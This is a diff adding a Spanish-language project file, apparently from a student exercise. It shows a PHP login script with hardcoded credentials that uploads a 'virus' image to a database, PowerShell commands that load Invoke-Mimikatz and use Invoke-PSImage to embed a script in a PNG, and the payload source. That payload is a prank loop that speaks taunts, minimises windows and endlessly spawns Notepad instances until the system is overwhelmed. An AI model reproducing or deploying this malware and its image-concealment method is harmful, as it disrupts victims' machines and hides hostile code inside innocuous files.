@@ -1,0 +1,112 @@
+<<<<<<<<< Tras realizar con exito el login se sube la foto con el virus a la BD >>>>>>>>>>>>
+
+<?php
+
+session_start();
+
+if($_SERVER["REQUEST_METHOD"] == "GET")
+{
+    $var = "C:/xampp/htdocs/P001/datos.ini";
+    $base = parse_ini_file($var);       
+    $php = new PDO($base["baseDeDatos"],$base["usuario"],$base["password"]);
+
+    $nombre = htmlspecialchars($_GET['user']); 
+    $enviar = htmlspecialchars($_GET['pass']);
+    $usuario = "pedro";
+    $pass= "123456";
+    $ok = "$usuario inicio sesion correctamente";
+    $error = "$usuario no inicio sesion debido a fallo en validacion";
+    if(! ($_GET['user'] == $usuario && $_GET['pass'] == $pass) )
+    {
+
+        Echo "<b>Acceso denegado</b>";        
+        
+        $file = fopen("Logins.txt", "a+");
+        fwrite($file, $error . PHP_EOL);
+
+        session_destroy() ;
+        
+        return false;
+    }
+    else {
+    
+        Echo "<b>Acceso concedido</b>";
+ 
+        $file = fopen("Logins.txt", "a+");
+        fwrite($file, $ok . PHP_EOL);
+
+        $imagen = file_get_contents('C:\Imgevil.jpg');
+        $ImagenUp = base64_encode($imagen);
+
+        $con = $php->prepare("INSERT INTO encabezados VALUES (DEFAULT,:tex);");
+        $con->bindParam(':tex', $ImagenUp);
+        $con->execute();
+
+        echo "<br>";
+        echo "<br>";
+        echo "<b>La imagen a sido guardada</b>";
+
+        session_destroy();    
+ 
+        return true;
+    }
+}
+
+?>
+
+
+<<<<<<<<<<<<<<<<<<<< Con Invoke-PSImage se crea la imagen que contiene el virus >>>>>>>>>>>>>>>
+
+Import-Module C:\Invoke-PSImage-master\Invoke-Mimikatz.ps1
+Invoke-PSImage -Script C:\virus.ps1 -Out C:\Imgevil.png -Image C:\G2Wallpaper.jpg
+
+<<<<<<<<<<<<<<<<<<< El virus que he usado >>>>>>>>>>>>>>>
+
+While (1){
+    
+    (New-Object -com SAPI.SpVoice).speak("Hello There")
+    Start-Process Chrome https://media1.tenor.com/images/e7c221a9fb102027fd9d463dac451d73/tenor.gif?itemid=9017746
+    Start-Sleep -Seconds 0,5
+    (New-Object -com SAPI.SpVoice).speak("Minimizando pestasñas")
+    (New-Object -ComObject Shell.Application).MinimizeAll()
+    Start-Sleep -Seconds 0,5
+    (New-Object -com SAPI.SpVoice).speak("¿Pensaste que acabo?")
+    Start-Sleep -Seconds 0,5
+    $codigo='
+    [DllImport("user32.dll", EntryPoint = "FindWindowEx")]public static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
+    [DllImport("User32.dll")]public static extern int SendMessage(IntPtr hWnd, int uMsg, int wParam, string lParam);
+    '
+    $notepad=Start-Process notepad -PassThru
+    $notepad.WaitForInputIdle()
+
+    $acciones=Add-Type -MemberDefinition $codigo -Name TextoNotepad -PassThru
+    $acciones::SendMessage([IntPtr]$acciones::FindWindowEx($notepad.MainWindowHandle, [IntPtr]::Zero, "Edit", $null), 0x000C, 0, "Esto esta siendo una molestia ¿verdad?")
+    
+    Start-Sleep -Seconds 1 
+    $acciones::SendMessage([IntPtr]$acciones::FindWindowEx($notepad.MainWindowHandle, [IntPtr]::Zero, "Edit", $null), 0x000C, 0, "Pues peor para ti")
+    
+    Start-Sleep -Seconds 1
+    $acciones::SendMessage([IntPtr]$acciones::FindWindowEx($notepad.MainWindowHandle, [IntPtr]::Zero, "Edit", $null), 0x000C, 0, "Intenta pararme")
+    
+    Start-Sleep -Seconds 1
+    $acciones::SendMessage([IntPtr]$acciones::FindWindowEx($notepad.MainWindowHandle, [IntPtr]::Zero, "Edit", $null), 0x000C, 0, "¿Preparado para el truco final?")
+    (New-Object -com SAPI.SpVoice).speak("¿Preparado para el truco final?")
+
+    Start-Sleep -Seconds 1
+    $acciones::SendMessage([IntPtr]$acciones::FindWindowEx($notepad.MainWindowHandle, [IntPtr]::Zero, "Edit", $null), 0x000C, 0, "Para esto... Si puedes")
+    (New-Object -com SAPI.SpVoice).speak("Para esto... Si puedes")
+    while(2){
+        $codigo='
+        [DllImport("user32.dll", EntryPoint = "FindWindowEx")]public static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
+        [DllImport("User32.dll")]public static extern int SendMessage(IntPtr hWnd, int uMsg, int wParam, string lParam);
+        '
+        $notepad=Start-Process notepad -PassThru
+        $notepad.WaitForInputIdle()
+
+        $acciones=Add-Type -MemberDefinition $codigo -Name TextoNotepad -PassThru
+        $acciones::SendMessage([IntPtr]$acciones::FindWindowEx($notepad.MainWindowHandle, [IntPtr]::Zero, "Edit", $null), 0x000C, 0, "Parame si puedes")
+
+        Start-Sleep -Milliseconds 5
+    }
+
+}
